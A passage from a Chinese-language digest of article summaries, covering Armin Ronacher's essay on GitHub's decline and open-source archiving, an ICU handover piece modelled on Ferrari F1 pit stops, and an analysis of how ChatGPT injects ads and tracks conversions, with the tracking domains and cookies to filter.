**原文链接**: [https://lucumr.pocoo.org/2026/4/28/before-github/](https://lucumr.pocoo.org/2026/4/28/before-github/)

**摘要：**  
阿尔明·罗纳彻反思了GitHub的衰落及开源领域中心化平台的脆弱性。他回顾了GitHub之前的时代——SourceForge、自托管的Trac/Subversion，以及像Pocoo这样需要个人服务器维护的项目。GitHub通过消除创建、发现和贡献的摩擦，彻底改变了开源生态，成为至关重要的社交与档案中心。然而，它也催生了微依赖爆炸现象——软件包在缺乏监管的情况下被随意发布。  
如今，罗纳彻认为GitHub正因不稳定性、产品更迭频繁以及偏离社区需求而“缓慢消亡”，诸如Ghostty等知名项目已转向Codeberg等替代平台。尽管去中心化能恢复自主权，却可能失去GitHub所保存的社交语境——议题、讨论与发布版本。他警告，我们或将退回一个充满断裂链接与废弃实例的旧网络时代。  
他的关键行动呼吁是：开源需要建立一个由公共资金支持、稳定可靠且不受任何单一企业影响的档案库，用以保存源代码、元数据及项目历史。目标是在保留GitHub所实现的记忆与协作能力的同时，摆脱对单个企业命运的依赖。

---

## 29. 从法拉利F1车队经验中改进ICU患者交接

**原文标题**: Improving ICU handovers by learning from Scuderia Ferrari F1 team

**原文链接**: [https://healthmanagement.org/c/icu/IssueArticle/improving-handovers-by-learning-from-scuderia-ferrari](https://healthmanagement.org/c/icu/IssueArticle/improving-handovers-by-learning-from-scuderia-ferrari)

**摘要：借鉴法拉利F1车队经验，优化ICU交班流程**

本文（日期：2026年4月29日）探讨了如何借鉴法拉利一级方程式车队维修站团队策略，改进重症监护室（ICU）交班流程。其核心前提是，F1车队能以近乎完美的精准度执行高风险、时间敏感的交替换岗，这使其成为ICU交班的理想模式——在ICU中，沟通失误常导致不良事件。

从F1借鉴的关键要点包括：
1. **标准化流程：** F1每次进站都采用严格、基于清单的流程，确保无步骤遗漏。文章建议ICU交班采用类似结构化工具（例如“I-PASS”助记符：病情严重程度、患者摘要、待办事项列表、情境意识及接收方复述）。
2. **明确角色分配：** F1中每位成员任务明确，知晓各自职责。作者建议明确指定一名“主导”临床医生控制交班流程，以及一名“接收者”复述关键信息。
3. **最大限度减少干扰：** F1维修站除必要指令外保持静默。文章提倡在ICU内设立专用、无干扰的交班空间与时间。
4. **闭环沟通：** F1机械师在执行指令前需确认已理解。同样，ICU团队应使用“回读”或“复述”方式，确认对关键患者数据（如用药、呼吸机设置）的理解无误。

文章总结，通过采纳这些源自F1的实践，ICU团队能在关键护理交接过程中减少信息丢失、提升患者安全，并增强团队协作。

---

## 30. ChatGPT如何投放广告

**原文标题**: How ChatGPT serves ads

**原文链接**: [https://www.buchodi.com/how-chatgpt-serves-ads-heres-the-full-attribution-loop/](https://www.buchodi.com/how-chatgpt-serves-ads-heres-the-full-attribution-loop/)

**摘要：ChatGPT如何投放广告**

OpenAI构建了一套双层广告系统：通过SSE流将广告注入ChatGPT对话，并借助商家端SDK追踪转化效果。广告以结构化的`single_advertiser_ad_unit`对象形式出现在对话事件流中，包含品牌信息、轮播卡片（标题、图片、点击链接）以及每条广告附带的四个Fernet加密令牌。

**定向投放**呈现语境相关性：同一用户会根据对话主题（如北京旅行、NBA季后赛、生产力工具等）接收到不同广告（Grubhub、GetYourGuide、Gametime、Canva等）。未发现利用历史对话记录的证据。

**四令牌归因链路**：
1. `ads_spam_integrity_payload` ——服务端完整性校验。
2. `oppref` ——写入`__oppref` Cookie（有效期30天）用于正向归因。
3. `olref` ——曝光侧日志令牌。
4. `ad_data_token` ——Base64封装的Fernet令牌用于对账。

**点击流程**：用户点击广告后，链接在ChatGPT网页视图中打开，URL附带`oppref`与`olref`。商家页面加载OAIQ SDK（`oaiq.min.js` v0.1.3），将`oppref`写入第一方Cookie并向`bzr.openai.com/v1/sdk/events`发送`measure`事件，完成从广告曝光到转化的闭环。

**拦截方式**：过滤`bzrcdn.openai.com`和`bzr.openai.com`域名；检查`__oppref`与`__oaiq_domain_probe` Cookie。

---

